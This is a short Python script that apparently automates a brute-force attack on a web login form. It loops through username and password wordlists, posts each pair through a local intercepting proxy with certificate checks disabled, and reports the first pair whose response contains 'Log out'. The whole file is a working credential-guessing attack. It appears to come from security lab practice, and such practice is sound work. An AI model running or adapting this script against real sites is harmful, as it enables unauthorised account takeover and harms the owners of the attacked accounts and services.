import urllib
import urllib3
import sys
from bs4 import BeautifulSoup
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

headers = {
    'User-Agent':'Mozilla/5.0'
}

user_file = "username.txt"
password_file = "password.txt"

def i_username(user_file):
    with open(user_file,"r") as file:
        usernames = file.readlines()
    usernames = [username.strip() for username in usernames]
    return usernames

def i_password(password_file):
    with open(password_file,'r') as file:
        passwords= file.readlines()
    passwords = [ password.strip() for password in passwords]
    return passwords

def perform_request(url):
    usernames = i_username(user_file)
    passwords = i_password(password_file)
    for user in usernames:
        for pas in passwords:
            payload = {"username": user, "password": pas}
            sys.stdout.write(f"\rTrying -> {user}:{pas}")
            sys.stdout.flush()
            try:
                r = requests.post(url, data=payload,verify=False,allow_redirects=False,proxies=proxies,headers=headers)
                res=r.text
            except requests.RequestException as e:
                print(f"The error is {e}")
                continue
            if "Log out" in res:
                return user, pas

def main():
    if len(sys.argv) != 2:
        print("format = script.py <URL path> <payload>")
        sys.exit(-1)
    url = sys.argv[1].strip()
    username, password = perform_request(url)
    print(f"the username and password are {username}, {password}")

if __name__=="__main__":
    main()